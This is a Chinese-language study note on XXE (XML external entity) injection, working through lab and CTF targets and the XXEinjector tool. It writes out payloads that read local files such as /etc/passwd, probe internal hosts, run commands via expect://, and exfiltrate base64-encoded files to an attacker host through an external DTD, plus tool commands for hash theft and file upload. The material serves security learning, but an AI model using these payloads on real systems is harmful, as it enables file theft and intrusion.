---
title: "网安笔记 - web漏洞 - XXE - xxe漏洞"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

### 一、思维导图

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946396091-c96807bc-763f-4bd0-995f-107756606642.png)

### 二、基础概念

#### 1、xml基础概念

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

#### 2、XML与HTML的主要差异

XML被设计为传输和存储数据，其焦点是数据的内容。

HTML被设计用来显示数据，其焦点是数据的外观。

HTML旨在显示信息，而XML旨在传输信息。

#### 3、xml示例

```
<!--文档类型定义-->
<!DOCTYPE note [	<!--定义此文档时note类型的文档-->
<!ELEMENT note (to,from,heading,body)>	<!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>			<!--定义to元素为"#PCDATA"类型-->
<!ELEMENT from (#PCDATA)>		<!--定义from元素为"#PCDATA"类型-->
<!ELEMENT head (#PCDATA)>		<!--定义head元素为"#PCDATA"类型-->
<!ELEMENT body (#PCDATA)>		<!--定义body元素为"#PCDATA"类型-->
]]]>

<!--文档元素-->
<note>
    <to>Dave</to>
    <from>Tom</from>
    <head>Reminder</head>
    <body>You are a good man</body>
</note>
```

### 三、演示案例

#### 1、pikachu靶场XML

-回显，玩法，协议，引入

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946671022-70bab52a-c29b-4130-a2e5-f29db8e6db96.png)

- 打开靶场

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946696208-1a10cd6d-321e-41ae-8666-985915480adf.png)

- 文件读取

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "file:///d://test.txt">
]>
<x>&xxe;</x>
```

**备注：**前提条件是有那个文件

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946802756-3a792c6d-79cc-4520-84bf-981bac9c821b.png)

- 玩法-内网探针或攻击内网应用（触发漏洞地址）

```
<?xml version = "1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTYTY rabbit SYSTEM "http://192.168.1.4:80/index.txt">
]>
<x>&rabbit;</x>
```

上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。\

- 玩法-RCE

该CASE是在安装expect扩展的PHP环境里执行系统命令

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
		<!ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe;</x>
```

id是对于的执行的命令。实战情况比较难碰到。

- 引入外部实体DTD

```
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "http://127.0.0.1/evil2.dtd">
		%file;
]>
<x>&send;</x>

//下面的是写入文件的
evil2.dtd:
<!ENTITY send SYSTEM "file:///d:/test.txt">
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629948681248-8a062064-0890-4502-a768-69bbae0c75ab.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629948714394-f028f032-a979-4bc8-82fd-770c0cff9a15.png)

条件：看对方的应用有没有禁用外部实体引用，这也是防御XXE的一种措施。  
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629948618203-3f2165cd-968e-4d18-ae08-6de6d57db6d1.png)

- 无回显-读取文件

```
<?xml version = "1.0"?>
<!DOCTYPE test [
		<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
		<!ENTITY % dtd SYSTEM "http://192.168.xx.xxx:80XX/test.dtd">
		%dtd;
		%send;
]>


test.dtd:
<!ENTITY % payload
	"<!ENTITY &#x25; send SYSTEM
'http://192.168.xx.xxx:80xx/?data=%file;'>"
>
%payload;
```

上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。

### 四、xxe绕过

```
https://www.cnblogs.com/20175211lyz/p/11413335.html
```

### 五、xxe靶场

#### 1、xxe-lab

```
https://github.com/c0ny1/xxe-lab
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629972753042-b968f599-0070-46b7-a693-30e5ba6e239f.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629973416531-8c0017d5-bb62-41e9-89e1-2e0075d1d200.png)

**备注**：不知道是啥子原因这个位置发送的数据包不是xml格式导致漏洞无法利用，在这里卡了很久，有知道解决办法再说吧

#### 2、CTF-Jarvis-OJ-Web-XXE

```
http://web.jarvisoj.com:9882/
更改请求数据格式:c

<?xml version= = "1.0"? >
<!DOCTYPE ANY [
	<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

点击Go，抓包

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630037602208-8fd74727-7739-43db-a4a5-d89da3a0e3fd.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210504114723.png)

数据传输形式是采用json数据格式来提交传输的。通过修改数据格式来攻击，形成XXE漏洞。

[![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1630037602198-aa8e9466-3745-410a-ac9c-97a4792314d9.png)](https://gitee.com/darkerg/article-images/raw/master/typora/20210504114855.png)

### 六、xxe工具

XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。

#### 1、获取地址

```
这里也给出github地址：https://github.com/enjoiz/XXEinjector
https://github.com/enjoiz/XXEinjector/archive/master.zip
```

#### 2、参数说明

```
--host     			必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
--file      		必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
--logger        	记录输出结果。
--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
--rport          远程主机的TCP端口信息。(--rport=8080)
--phpfilter    	在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
--netdoc     		使用netdoc协议。(Java).
--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
--hashes       窃取运行当前应用程序用户的Windows哈希。
--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)
--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
--xslt      		XSLT注入测试。
--ssl              使用SSL。
--proxy         使用代理。(--proxy=127.0.0.1:8080)
--httpport 		Set自定义HTTP端口。(--httpport=80)
--ftpport       设置自定义FTP端口。(--ftpport=21)
--gopherport  设置自定义gopher端口。(--gopherport=70)
--jarport       设置自定义文件上传端口。(--jarport=1337)
--xsltport  	设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
--test     		该模式可用于测试请求的有效。
--urlencode     URL编码，默认为URI。
--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)
--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
--fast     		跳过枚举询问，有可能出现结果假阳性。
--verbose     显示verbose信息。
```

#### 3、工具使用

枚举HTTPS应用程序中的/etc目录：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl
```

使用gopher（OOB方法）枚举/etc目录：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
```

二次漏洞利用：

```
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt
```

使用HTTP带外方法和netdoc协议对文件进行爆破攻击：

```
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc
```

通过直接性漏洞利用方式进行资源枚举：

```
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
```

枚举未过滤的端口：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
```

窃取Windows哈希：

```
ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes
```

使用Java jar上传文件：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf
```

使用PHP expect执行系统指令：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls
```

测试XSLT注入：

```
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt
```

记录请求信息：

```
ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt
```